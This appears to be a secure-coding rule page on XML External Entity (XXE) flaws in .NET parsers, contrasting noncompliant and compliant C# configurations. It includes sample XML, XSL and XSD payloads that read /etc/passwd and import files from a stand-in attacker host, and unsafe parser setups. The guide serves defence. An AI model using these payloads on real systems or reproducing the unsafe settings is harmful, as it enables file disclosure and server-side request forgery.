XML specification allows the use of entities that can be internal or external (file system / network access ...).

Allowing access to external entities in XML parsing could lead to vulnerabilities like confidential file disclosures or SSRFs:

Example in XML document:

<?xml version="1.0" encoding="utf-8"?>
  <!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
<note xmlns="http://www.w3schools.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.attacking.com/deleteall">
  <to>&xxe;</to>
  <from>Jani</from>
  <heading>Reminder</heading>
  <body>Don't forget me this weekend!</body>
</note>

Example in XSL document:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY content SYSTEM "file:/etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:import href="http://www.attacker.com/evil.xsl"/>
  <xsl:include href="http://www.attacker.com/evil.xsl"/>
 <xsl:template match="/">
  &content;
 </xsl:template>
</xsl:stylesheet>

Example in XSD document:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE schema PUBLIC "-//W3C//DTD XMLSchema 200102//EN" "" [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:import namespace="test" schemaLocation="http://www.attacker.com/evil.xsd"/>
  <xs:element name="note">
    <xs:complexType>
      <xs:sequence>
        <xs:element name="to" type="xs:string"/>
        <xs:element name="from" type="xs:string"/>
        <xs:element name="heading" type="xs:string"/>
        <xs:element name="body" type="xs:string"/>
      </xs:sequence>
    </xs:complexType>
  </xs:element>
</xs:schema>

It is recommended to disable access to external entities.

Noncompliant Code Examples

System.Xml.Linq.XDocument

XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Parse; // Unsafe: DTDs will be processed
settings.XmlResolver = new XmlUrlResolver(); // Unsafe: XmlUrlResolver is used to resolve external XML resources such as entities, document type definitions (DTDs) or schemas.
XmlReader reader = XmlReader.Create("xxe.xml", settings); // Noncompliant: parser created with unsafe configurations

XDocument parser = XDocument.Load(reader);

System.Xml.XmlDictionaryReader

XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Parse;
settings.XmlResolver = new XmlUrlResolver();

XmlReader reader = XmlReader.Create("xxe.xml", settings);
XmlDictionaryReader dict = XmlDictionaryReader.CreateDictionaryReader(reader);
while (dict.Read()) // Noncompliant: XmlDictionaryReader is safe by default and becomes unsafe if used with an unsafe parser (here XmlReader)
{ ... }

System.Xml.XmlDocument

// .NET Framework < 4.5.2
XmlDocument parser = new XmlDocument();
parser.LoadXml("xxe.xml"); // Noncompliant: XmlDocument is not safe by default

or

// .NET Framework 4.5.2+
XmlDocument parser = new XmlDocument();
parser.XmlResolver = new XmlUrlResolver();
parser.LoadXml("xxe.xml"); // Noncompliant: XmlDocument.XmlResolver configured with XmlUrlResolver that makes it unsafe

System.Xml.XmlReader

// .NET Framework 4.5.2+
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Parse;
settings.XmlResolver = new XmlUrlResolver();
XmlReader reader = XmlReader.Create("xxe.xml", settings);
while (reader.Read()) // Noncompliant: XmlReader is safe by default and becomes unsafe if DtdProcessing = Parse and XmlResolver is not null
{ ... }

System.Xml.XmlTextReader

// .NET Framework < 4.5.2
XmlTextReader reader = new XmlTextReader("xxe.xml");
while (reader.Read()) // Noncompliant: XmlTextReady is not safe by default
{ ... }

or

// .NET Framework 4.5.2+
XmlTextReader reader = new XmlTextReader("xxe.xml");
reader.XmlResolver = new XmlUrlResolver();
while (reader.Read()) // Noncompliant: XmlTextRead.XmlResolver configured with XmlUrlResolver that makes it unsafe
{ ... }

Compliant Solution

System.Xml.Linq.XDocument

XDocument parser = XDocument.Load("xxe.xml"); // Compliant: XDocument is safe by default. DTD processing is turned off by default as described in https://github.com/dotnet/docs/blob/master/docs/csharp/programming-guide/concepts/linq/linq-to-xml-security.md

System.Xml.XmlDictionaryReader

XmlDictionaryReader reader = XmlDictionaryReader.CreateTextReader(Encoding.ASCII.GetBytes(xmlText), XmlDictionaryReaderQuotas.Max);
while (reader.Read()) // Compliant: XmlReXmlDictionaryReaderader is safe by default
{ ... }

System.Xml.XmlDocument

XmlDocument parser = new XmlDocument();
parser.XmlResolver = null;
parser.LoadXml("xxe.xml"); // Compliant: XmlResolver has been set to null

or

XmlDocument parser = new XmlDocument();
parser.LoadXml("xxe.xml"); // Compliant: XmlDocument is safe by default in  .NET Framework 4.5.2+ because XmlResolver is set by default to null

System.Xml.XmlNodeReader

XmlDocument doc = new XmlDocument();
doc.LoadXml("xxe.xml); // XmlDocument is safe by default in  .NET Framework 4.5.2+

XmlNodeReader reader = new XmlNodeReader(doc);  // Compliant: XmlNodeReader is safe by default even if XmlDocument is not

System.Xml.XmlReader

XmlReader reader = XmlReader.Create("xxe.xml");
while (reader.Read()) // Compliant: XmlReader is safe by default
{ ... }

System.Xml.XmlTextReader

// .NET 4.5.2+
XmlTextReader reader = new XmlTextReader("xxe.xml");
while (reader.Read()) // Compliant: XmlTextReader is safe by default in  .NET Framework 4.5.2+ because XmlResolver is set by default to null
{ ... }

// .NET 4.0 to .NET 4.5.1
XmlTextReader reader = new XmlTextReader("xxe.xml");
reader.DtdProcessing = DtdProcessing.Prohibit; // Compliant: XmlTextReader is safe by default in  .NET Framework 4.5.2+ because XmlResolver is set by default to null

// < .NET 4.0
XmlTextReader reader = new XmlTextReader(stream);
reader.ProhibitDtd = true; // Compliant: default is false
